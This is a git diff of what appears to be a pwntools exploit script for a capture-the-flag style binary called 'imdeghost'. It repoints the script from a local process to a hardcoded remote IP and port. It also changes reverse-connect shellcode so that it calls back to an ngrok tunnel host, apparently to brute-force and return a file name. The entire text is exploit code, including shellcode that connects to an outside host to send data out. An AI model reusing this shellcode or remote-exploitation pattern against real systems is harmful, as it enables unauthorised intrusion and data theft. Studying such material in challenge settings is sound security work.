@@ -6,7 +6,8 @@ e = ELF('./imdeghost')
 
 context.binary = e
 
-p = process(e.path)
+#p = process(e.path)
+p = remote('143.198.127.103', 42007)
 
 #funcs
 
@@ -36,7 +37,7 @@ buf2 = 0x400
 
 #reverse connect and brute force file name
 
-shellcode = shellcraft.connect('4.tcp.ngrok.io', 13964)
+shellcode = shellcraft.connect('8.tcp.ngrok.io', 17942)
 shellcode += '''
     /* brute force file name */
 
